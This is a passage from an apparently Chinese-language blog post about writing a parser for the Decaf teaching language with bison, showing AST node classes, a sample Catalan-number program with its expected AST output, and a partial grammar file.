class="keyword">new</span> decafStmtList()); <span class="keyword">delete</span> $<span class="number">2</span>; &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// parse the input and create the abstract syntax tree</span></span><br><span class="line">  <span class="keyword">int</span> retval = yyparse();</span><br><span class="line">  <span class="keyword">return</span>(retval &gt;= <span class="number">1</span> ? EXIT_FAILURE : EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在 <code>decafast.cc</code> 中提供了3个节点的类结构：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="keyword">virtual</span> ~<span class="built_in">decafAST</span>() &#123;&#125;</span><br><span class="line">  <span class="function"><span class="keyword">virtual</span> string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;&quot;</span>); &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">decafStmtList</span> :</span> <span class="keyword">public</span> decafAST &#123; <span class="comment">/* 管理decaf语句 */</span></span><br><span class="line">	list&lt;decafAST *&gt; stmts;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">decafStmtList</span>() &#123;&#125;</span><br><span class="line">	~<span class="built_in">decafStmtList</span>() &#123;</span><br><span class="line">		<span class="keyword">for</span> (list&lt;decafAST *&gt;::iterator i = stmts.<span class="built_in">begin</span>(); i != stmts.<span class="built_in">end</span>(); i++) &#123; </span><br><span class="line">			<span class="keyword">delete</span> *i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> stmts.<span class="built_in">size</span>(); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_front</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_front</span>(e); &#125;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">push_back</span><span class="params">(decafAST *e)</span> </span>&#123; stmts.<span class="built_in">push_back</span>(e); &#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> commaList&lt;class decafAST *&gt;(stmts); &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PackageAST</span> :</span> <span class="keyword">public</span> decafAST &#123; <span class="comment">/* 管理decaf类 */</span></span><br><span class="line">	string Name;</span><br><span class="line">	decafStmtList *FieldDeclList;</span><br><span class="line">	decafStmtList *MethodDeclList;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">PackageAST</span>(string name, decafStmtList *fieldlist, decafStmtList *methodlist) </span><br><span class="line">		: <span class="built_in">Name</span>(name), <span class="built_in">FieldDeclList</span>(fieldlist), <span class="built_in">MethodDeclList</span>(methodlist) &#123;&#125;</span><br><span class="line">	~<span class="built_in">PackageAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (FieldDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> FieldDeclList; &#125;</span><br><span class="line">		<span class="keyword">if</span> (MethodDeclList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> MethodDeclList; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; </span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Package&quot;</span>) + <span class="string">&quot;(&quot;</span> + Name + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(FieldDeclList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(MethodDeclList) + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProgramAST</span> :</span> <span class="keyword">public</span> decafAST &#123; <span class="comment">/* 管理decaf程序 */</span></span><br><span class="line">	decafStmtList *ExternList;</span><br><span class="line">	PackageAST *PackageDef;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">ProgramAST</span>(decafStmtList *externs, PackageAST *c) : <span class="built_in">ExternList</span>(externs), <span class="built_in">PackageDef</span>(c) &#123;&#125;</span><br><span class="line">	~<span class="built_in">ProgramAST</span>() &#123; </span><br><span class="line">		<span class="keyword">if</span> (ExternList != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> ExternList; &#125; </span><br><span class="line">		<span class="keyword">if</span> (PackageDef != <span class="literal">NULL</span>) &#123; <span class="keyword">delete</span> PackageDef; &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">string <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">string</span>(<span class="string">&quot;Program&quot;</span>) + <span class="string">&quot;(&quot;</span> + <span class="built_in">getString</span>(ExternList) + <span class="string">&quot;,&quot;</span> + <span class="built_in">getString</span>(PackageDef) + <span class="string">&quot;)&quot;</span>; &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在分析的过程中需要为每一个可能得节点设置对应的类</li>
</ul>
<p>最开始尝试的时候比较迷茫，不知道从何入手，于是先看一个程序提供的案例来进行分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">print_int</span><span class="params">(<span class="keyword">int</span>)</span> <span class="keyword">void</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> func <span class="title">read_int</span><span class="params">()</span> <span class="keyword">int</span></span>;</span><br><span class="line"></span><br><span class="line">package Catalan &#123;</span><br><span class="line"></span><br><span class="line">    <span class="function">func <span class="title">main</span><span class="params">()</span> <span class="keyword">void</span> </span>&#123;</span><br><span class="line">       print_int( cat( read_int() ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// factorial of n</span></span><br><span class="line">    <span class="function">func <span class="title">fact</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="keyword">int</span> </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (n == <span class="number">1</span>) &#123; <span class="keyword">return</span>(<span class="number">1</span>); &#125;</span><br><span class="line">       <span class="keyword">else</span> &#123; <span class="keyword">return</span>(n*fact(n<span class="number">-1</span>)); &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a choose b</span></span><br><span class="line">    <span class="function">func <span class="title">choose</span><span class="params">(a <span class="keyword">int</span>, b <span class="keyword">int</span>)</span> <span class="keyword">int</span> </span>&#123; </span><br><span class="line">       <span class="keyword">return</span>( fact(a) / (fact(b)*fact(a-b)) ); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// catalan number of n</span></span><br><span class="line">    <span class="function">func <span class="title">cat</span><span class="params">(n <span class="keyword">int</span>)</span> <span class="keyword">int</span> </span>&#123; </span><br><span class="line">       <span class="keyword">return</span>( choose(<span class="number">2</span>*n,n)/(n+<span class="number">1</span>) ); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Program(ExternFunction(print_int,VoidType,VarDef(IntType)),ExternFunction(read_int,IntType,None),Package(Catalan,None,Method(main,VoidType,None,MethodBlock(None,MethodCall(print_int,MethodCall(cat,MethodCall(read_int,None))))),Method(fact,IntType,VarDef(n,IntType),MethodBlock(None,IfStmt(BinaryExpr(Eq,VariableExpr(n),NumberExpr(<span class="number">1</span>)),Block(None,ReturnStmt(NumberExpr(<span class="number">1</span>))),Block(None,ReturnStmt(BinaryExpr(Mult,VariableExpr(n),MethodCall(fact,BinaryExpr(Minus,VariableExpr(n),NumberExpr(<span class="number">1</span>))))))))),Method(choose,IntType,VarDef(a,IntType),VarDef(b,IntType),MethodBlock(None,ReturnStmt(BinaryExpr(Div,MethodCall(fact,VariableExpr(a)),BinaryExpr(Mult,MethodCall(fact,VariableExpr(b)),MethodCall(fact,BinaryExpr(Minus,VariableExpr(a),VariableExpr(b)))))))),Method(cat,IntType,VarDef(n,IntType),MethodBlock(None,ReturnStmt(BinaryExpr(Div,MethodCall(choose,BinaryExpr(Mult,NumberExpr(<span class="number">2</span>),VariableExpr(n)),VariableExpr(n)),BinaryExpr(Plus,VariableExpr(n),NumberExpr(<span class="number">1</span>))))))))</span><br></pre></td></tr></table></figure>
<ul>
<li>在 Program 中并列了3个节点：ExternFunction，ExternFunction，Package</li>
<li>在每个节点中又详细描述了它的基础信息</li>
</ul>
<p>模仿上述结构，可以写一个初版分析器：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br></pre></td><td class="code"><pre><span class="line">%&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;default-defs.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yylex</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">yyerror</span><span class="params">(<span class="keyword">char</span> *)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">// print AST?</span></span><br><span class="line"><span class="keyword">bool</span> printAST = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;decafast.cc&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line">%&#125;</span><br><span class="line"></span><br><span class="line">%define parse.error verbose</span><br><span class="line"></span><br><span class="line">%<span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">decafAST</span> *<span class="title">ast</span>;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> *sval;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">%token T_PACKAGE T_EXTERN T_FUNC T_SEMICOLON T_COMMA T_CONTINUE T_FALSE T_TRUE T_VAR T_FOR T_NULL T_RETURN T_WHITESPACE</span><br><span class="line">%token T_AND T_ASSIGN T_DIV T_DOT T_EQ T_RIGHTSHIFT T_GEQ T_GT T_LEFTSHIFT T_LEQ T_LT T_MINUS T_MOD T_MULT T_NEQ T_NOT T_OR T_PLUS</span><br><span class="line">%token T_VOID T_INTTYPE T_BOOLTYPE T_STRINGTYPE</span><br><span class="line">%token T_LCB T_RCB T_LPAREN T_RPAREN T_LSB T_RSB </span><br><span class="line">%token T_COMMENT</span><br><span class="line">%token T_BREAK T_ELSE T_IF T_WHILE</span><br><span class="line">%token &lt;sval&gt; T_ID T_INTCONSTANT T_CHARCONSTANT T_STRINGCONSTANT</span><br><span class="line"></span><br><span class="line">%type &lt;ast&gt; state_if state_while state_for state_break state_continue state_return <span class="built_in">exp</span> assign method_call lvalue statements statement extern_list para_list_use para_usen para_use para_list_def block blockt var_decls var_decl method_decls method_decl decafpackage extern_def extern_defn extern_typen extern_type func_typen func_type method_type array_type type</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line">start: program</span><br><span class="line"></span><br><span class="line">program: extern_list decafpackage&#123; </span><br><span class="line">        ProgramAST *prog = <span class="keyword">new</span> ProgramAST((decafStmtList *)$<span class="number">1</span>, (PackageAST *)$<span class="number">2</span>); </span><br><span class="line">		<span class="keyword">if</span> (printAST) &#123;</span><br><span class="line">			<span class="built_in">cout</span> &lt;&lt; getString(prog) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="keyword">delete</span> prog;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_list: extern_defn &#123; </span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_defn: extern_def extern_defn &#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_def: T_EXTERN T_FUNC T_ID T_LPAREN para_list_def T_RPAREN method_type T_SEMICOLON &#123;</span><br><span class="line">        decafEXFuncDef *func = <span class="keyword">new</span> decafEXFuncDef();</span><br><span class="line">        decafPara* para = (decafPara*)$<span class="number">5</span>;</span><br><span class="line">        decafType * type = (decafType *)$<span class="number">7</span>;</span><br><span class="line">        func-&gt;put_name($<span class="number">3</span>);</span><br><span class="line">        func-&gt;put_type(type-&gt;get_type());</span><br><span class="line">        func-&gt;put_para((decafPara*)para);</span><br><span class="line">        $$ = func;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">3</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_list_use: para_usen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_usen: para_use T_COMMA para_usen &#123;</span><br><span class="line">        decafStmtList * para = (decafStmtList *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | para_use &#123;</span><br><span class="line">        decafStmtList * para = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        para-&gt;push_front($<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">para_use: method_call &#123; $$ = $<span class="number">1</span>;&#125;</span><br><span class="line">    | <span class="built_in">exp</span> &#123;$$ = $<span class="number">1</span>;&#125; </span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">para_list_def: extern_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | func_typen &#123;</span><br><span class="line">        $$ = $<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        decafStmtList *slist = <span class="keyword">new</span> decafStmtList();</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_typen: func_type T_COMMA func_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;     </span><br><span class="line">    &#125;</span><br><span class="line">    | func_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;   </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">func_type: T_ID extern_type &#123;</span><br><span class="line">        decafType* type = (decafType*)$<span class="number">2</span>;</span><br><span class="line">        type-&gt;put_name($<span class="number">1</span>);</span><br><span class="line">        $$ = type;</span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">1</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_typen: extern_type T_COMMA extern_typen &#123;</span><br><span class="line">        decafPara * para = (decafPara *)$<span class="number">3</span>;</span><br><span class="line">        para-&gt;push_front((decafType *)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    | extern_type &#123;</span><br><span class="line">        decafPara * para = <span class="keyword">new</span> decafPara();</span><br><span class="line">        para-&gt;push_front((decafType*)$<span class="number">1</span>);</span><br><span class="line">        $$ = para;</span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">extern_type: T_STRINGTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;StringType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | type &#123; decafType* type = (decafType* )$<span class="number">1</span>; $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">method_type: T_VOID &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;VoidType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | type &#123; decafType* type = (decafType* )$<span class="number">1</span>; $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">array_type: T_LSB T_INTCONSTANT T_RSB type &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">type: T_INTTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;IntType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    | T_BOOLTYPE &#123; decafType* type = <span class="keyword">new</span> decafType(<span class="string">&quot;BoolType&quot;</span>); $$ = type;&#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">decafpackage: T_PACKAGE T_ID T_LCB var_decls method_decls T_RCB &#123;</span><br><span class="line">        decafStmtList *field = (decafStmtList *)$<span class="number">4</span>;</span><br><span class="line">        decafStmtList *method = (decafStmtList *)$<span class="number">5</span>;</span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, field, method); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    | T_PACKAGE T_ID T_LCB T_RCB &#123; </span><br><span class="line">        $$ = <span class="keyword">new</span> PackageAST(*$<span class="number">2</span>, <span class="keyword">new</span> decafStmtList(), <span class="keyword">new</span> decafStmtList()); </span><br><span class="line">        <span class="keyword">delete</span> $<span class="number">2</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    ;</span><br><span class="line"></span><br><span class="line">var_decls: var_decl var_decls&#123;</span><br><span class="line">        decafStmtList *slist = (decafStmtList *)$<span class="number">2</span>;</span><br><span class="line">        slist-&gt;push_front((decafAST *)$<span class="number">1</span>);</span><br><span class="line">        $$ = slist;</span><br><span class="line">    &#125;</span><br><span class="line">    | &#123;</span><br><span class="line">        